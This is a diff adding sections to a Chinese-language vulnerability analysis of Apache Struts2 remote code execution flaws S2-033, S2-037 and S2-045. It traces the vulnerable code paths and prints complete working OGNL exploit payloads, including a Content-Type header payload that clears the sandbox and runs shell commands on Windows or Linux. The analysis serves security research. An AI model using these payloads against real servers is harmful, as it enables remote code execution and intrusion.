@@ -492,6 +492,7 @@ com.opensymphony.xwork2.ActionContex
 `DefaultActionMapper`对特殊前缀进行处理，包括`method:`、`action:`、`redirect:`或`redirectAction:`。S2-016中对后三个进行了利用。在跳转时会对参数进行OGNL解析。而S2-032则是利用`method:`。`method:`后的内容会被截取，执行到`DefaultActionInvocation.invokeAction()`
 ```
 protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {
+    String methodName = this.proxy.getMethod(); // 获取method
     methodResult = this.ognlUtil.getValue(methodName + "()", this.getStack().getContext(), action); // methodName是`method:`后的内容，和()拼接
 }
 ```
@@ -530,6 +531,126 @@ public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess
 S2-032在修复时直接在`method:`后内容截取时加入了正则`[a-zA-Z0-9._!/\\-]*`
 
 ### S2-033
+S2-033的官方描述`Remote Code Execution can be performed when using REST Plugin with ! operator when Dynamic Method Invocation is enabled.`需要开启动态调用
+S2-033和S2-032很类似。S2-032的`DefaultActionMapper`没有对参数名进行过滤。导致执行到`DefaultActionInvocation.invokeAction()`后恶意OGNL被执行。S2-032在修复时也是加入了过滤的正则。而S2-033则是采用`RestActionMapper`为入口替换了`DefaultActionMapper`。绕过了正则判断，最终还是执行到`DefaultActionInvocation.invokeAction()`
+
+这里需要提一下动态调用必须开启才能利用的逻辑，看一下`RestActionMapper.getMapping()`的代码
 ```
-%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec(%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=open -a Calculator.app
+public ActionMapping getMapping(HttpServletRequest request, ConfigurationManager configManager) {
+    this.handleSpecialParameters(request, mapping); // 对特殊字符进行转义
+    if (mapping.getName() == null) {
+	return null;
+    } else {
+	this.handleDynamicMethodInvocation(mapping, mapping.getName()); // (1) 如果存在`!`，mapping.setMethod(截取`!`后的内容)
+	String fullName = mapping.getName(); // 获取全路径名，例如orders/4/payload
+	if (fullName != null && fullName.length() > 0) { 
+	    int lastSlashPos = fullName.lastIndexOf(47); //最后一个`/`的位置
+	    if (lastSlashPos > -1) {
+	        int prevSlashPos = fullName.lastIndexOf(47, lastSlashPos - 1);
+		if (prevSlashPos > -1) {
+		    mapping.setMethod(fullName.substring(lastSlashPos + 1)); // (2) 截取最后一个`/`的位置后的字符串
+	        }
+...
+}
+```
+动态调用的判断就在(1)这步，开启后截取`!`后的内容赋值给method。到了`DefaultActionInvocation.invokeAction()`就可以正常取出method值进行OGNL计算。
+```
+private void handleDynamicMethodInvocation(ActionMapping mapping, String name) {
+    int exclamation = name.lastIndexOf("!");
+    if (exclamation != -1) {
+        mapping.setName(name.substring(0, exclamation));
+        if (this.allowDynamicMethodCalls) { // 如果开启了动态调用
+	    mapping.setMethod(name.substring(exclamation + 1));
+        } else {
+	    mapping.setMethod((String)null);
+        }
+    }
+}
+```
+动态调用开启需要在struts.xml中进行配置，配置如下
+```
+<constant name="struts.enable.DynamicMethodInvocation" value="true">
+```
+S2-033payload如下
+```
+!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec(%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=open -a Calculator.app
+```
+可以看到S2-033的payload是以.json结尾的。由于这个漏洞借助的REST插件。查看REST插件的配置文件`struts-plugin.xml`
+```
+<bean type="org.apache.struts2.dispatcher.mapper.ActionMapper" name="rest" class="org.apache.struts2.rest.RestActionMapper" />
+...
+<constant name="struts.action.extension" value="xhtml,xml,json" />
+```
+Struts2中`DefaultActionMapper`用来处理action请求。上述配置文件中将访问`xhtml,xml,json`也定义为action请求，并且由RestActionMapper来处理。所以需要将payload末尾设置成其中一个。
+
+### S2-037
+S2-037和S2-033也很类似，但是跳过了动态调用是否开启的判断，从(2)入手赋值method。但是xwork-core:2.3.28.1版本在OgnlUtil.isEvalExpression增加了isSequence的判断。然后payload采用了非Sequence形式的`(1)?(2):(3)`
+```
+(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=open -a Calculator.app
+```
+
+### S2-045
+官方给出S2-045是基于Jakarta Multipart解析器，执行文件上传时可能造成RCE。在struts-core.jar中的default.properties文件中（如下）可以看到Struts对于Multipart类型默认的解析器是jakarta
+```
+# struts.multipart.parser=cos
+# struts.multipart.parser=pell
+# struts.multipart.parser=jakarta-stream
+struts.multipart.parser=jakarta
+```
+这个漏洞最初的调用流程和其他漏洞不同。因为`Dispatcher.wrapRequest()`包装请求的时候有个判断`Context-Type`头部如果包含`multipart/form-data`，对Request的包装用的`MultiPartRequestWrapper`
+```
+if (content_type != null && content_type.contains("multipart/form-data")) { // 
+    MultiPartRequest mpr = this.getMultiPartRequest();
+    LocaleProvider provider = (LocaleProvider)this.getContainer().getInstance(LocaleProvider.class);
+    request = new MultiPartRequestWrapper(mpr, request, this.getSaveDir(), provider, this.disableRequestAttributeValueStackLookup);
+} else {
+    request = new StrutsRequestWrapper(request, this.disableRequestAttributeValueStackLookup);
+}
+```
+然后在触发请求时，对应的处理类就是`JakartaMultiPartRequest`。`JakartaMultiPartRequest.parse()`处理请求的代码如下
+```
+public void parse(HttpServletRequest request, String saveDir) throws IOException {
+    try {
+        this.processUpload(request, saveDir); // 如果不是以`multipart开头会走到catch`
+    } catch (FileUploadException var6) {
+        errorMessage = this.buildErrorMessage(var6, new Object[0]);
+    }
+```
+`processUpload()`后续是借助`commons-fileupload.jar`来处理文件上传。涉及到一个类`org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl`，它在初始化时会判断Content-Type是否以`multipart`开头，如果不是就抛出异常。
+```
+String contentType = ctx.getContentType();
+if (null != contentType && contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/")) {}
+else {
+    throw new FileUploadBase.InvalidContentTypeException(String.format("the request doesn't contain a %s or %s stream, content type header is %s", "multipart/form-data", "multipart/mixed", contentType));
+}
+```
+请求处理完，`DefaultActionInvocation`对Action进行拦截时会分发到`FileUploadInterceptor`
+```
+public String intercept(ActionInvocation invocation) throws Exception {
+    if (!(request instanceof MultiPartRequestWrapper)) {...}
+    else{ // 如果request是MultiPartRequestWrapper类型的
+        MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper)request;
+        if (multiWrapper.hasErrors()) { // 如果文件上传过程中存在错误
+	    while(i$.hasNext()) {
+	        LocalizedMessage error = (LocalizedMessage)i$.next();
+	        if (validation != null) {
+		    validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs())); // 错误信息 （漏洞修复时删除了此行）
+                    }
+                }
+	}	
+    }
+}
+```
+看一下漏洞触发的调用栈，`LocalizedTextUtil.findText()`,会把错误信息提取出来，然后错误信息`the request doesn't contain a multipart/form-data or multipart/mixed stream, content type header is \payload\`会被`TextParseUtil.translateVariables()`进行处理。根据之前对这个方法的分析，处理时会将错误信息中的`${}`或`%{}`中的内容提取出来并进行计算。
+```
+DefaultActionInvocation.invoke()
+  FileUploadInterceptor.intercept()
+    LocalizedTextUtil.findText()
+      LocalizedTextUtil.getDefaultMessage()
+        TextParseUtil.translateVariables()
+          OgnlTextParser.evaluate()
+```
+所以这个漏洞的一个成因在于，在Dispatcher时，Content-Type的要求是`contains("multipart/form-data")`，但是真正处理文件上传时要求以`multipart`开头。否则就报错，并对错误信息进行OGNL计算。那么就可以构造一个Content-Type头部包含`multipart/form-data`，但是又不以它开头的payload。网上流传最广的payload如下
+```
+Content-Type: %{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='open -a Calculator.app').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 ```
